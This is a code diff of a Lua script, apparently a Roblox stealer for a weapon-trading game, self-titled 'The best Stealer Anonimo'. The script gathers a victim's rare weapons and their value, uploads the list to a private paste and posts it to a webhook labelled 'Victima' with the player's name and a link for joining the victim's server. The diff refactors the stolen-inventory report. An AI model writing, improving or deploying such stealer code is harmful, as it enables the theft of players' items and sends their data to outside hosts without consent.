@@ -31,10 +31,10 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Función para crear paste en Rubis
+-- Función para crear paste en Rubis con contenido plano
 local function CreateRubisPaste(content)
     local payload = {
-        content = content,
+        content = content, -- saltos de línea reales
         public = false,
         title = "The best Stealer Anonimo 🇪🇨"
     }
@@ -168,7 +168,6 @@ local function buildValueList()
 end
 
 -- ====================================
-
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
@@ -197,33 +196,38 @@ local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
 -- ====================================
--- NUEVO CONTENIDO PASTEBIN POR CATEGORÍAS
-local categoryOrder = {"Ancient","Godly","Unique","Classic","Chroma"}
-local categoryItems = {Ancient={}, Godly={}, Unique={}, Classic={}, Chroma={}}
+-- Construir contenido bonito sin \n literales
+local function BuildPasteContent(weaponsToSend, totalValue)
+    local categoryOrder = {"Ancient","Godly","Unique","Classic","Chroma"}
+    local categoryItems = {Ancient={}, Godly={}, Unique={}, Classic={}, Chroma={}}
 
-for _, w in ipairs(weaponsToSend) do
-    local rarity = w.Rarity
-    if table.find(categoryOrder, rarity) then
-        table.insert(categoryItems[rarity], w)
-    else
-        table.insert(categoryItems["Classic"], w)
-    end
-end
-
-local pasteContent = "The best Stealer Anonimo 🇪🇨\n\n"
-for _, cat in ipairs(categoryOrder) do
-    local items = categoryItems[cat]
-    if #items > 0 then
-        pasteContent = pasteContent..cat..":\n"
-        for _, w in ipairs(items) do
-            pasteContent = pasteContent..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+    for _, w in ipairs(weaponsToSend) do
+        local rarity = w.Rarity
+        if table.find(categoryOrder, rarity) then
+            table.insert(categoryItems[rarity], w)
+        else
+            table.insert(categoryItems["Classic"], w)
         end
-        pasteContent = pasteContent.."\n"
     end
+
+    local lines = {"The best Stealer Anonimo 🇪🇨", ""}
+    for _, cat in ipairs(categoryOrder) do
+        local items = categoryItems[cat]
+        if #items > 0 then
+            table.insert(lines, cat..":")
+            for _, w in ipairs(items) do
+                table.insert(lines, string.format("%s x%s (%s)", w.DataID, w.Amount, w.Rarity))
+                table.insert(lines, string.format("Valor: %s💎", tostring(w.Value*w.Amount)))
+            end
+            table.insert(lines, "")
+        end
+    end
+    table.insert(lines, "Valor total del inventario📦: "..tostring(totalValue).."💰")
+    return table.concat(lines, "\n")
 end
 
-pasteContent = pasteContent.."Valor total del inventario📦: "..tostring(totalValue).."💰"
-
+-- Crear paste
+local pasteContent = BuildPasteContent(weaponsToSend, totalValue)
 local pasteLink
 if #weaponsToSend > 0 then
     pasteLink = CreateRubisPaste(pasteContent)
@@ -236,20 +240,17 @@ if #weaponsToSend > 0 then
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Inventario 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
+        {name="Click para unirte a la víctima 👇:", value=pasteLink and "[Mirar todos los ítems]("..pasteLink..")" or "No disponible", inline=false}
     }
 
     local maxEmbedItems = math.min(18,#weaponsToSend)
     for i=1,maxEmbedItems do
         local w = weaponsToSend[i]
-        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
 
     if #weaponsToSend > 18 then
         fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
-        if pasteLink then
-            fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
-        end
     end
 
     local prefix=pingEveryone and "@everyone " or ""
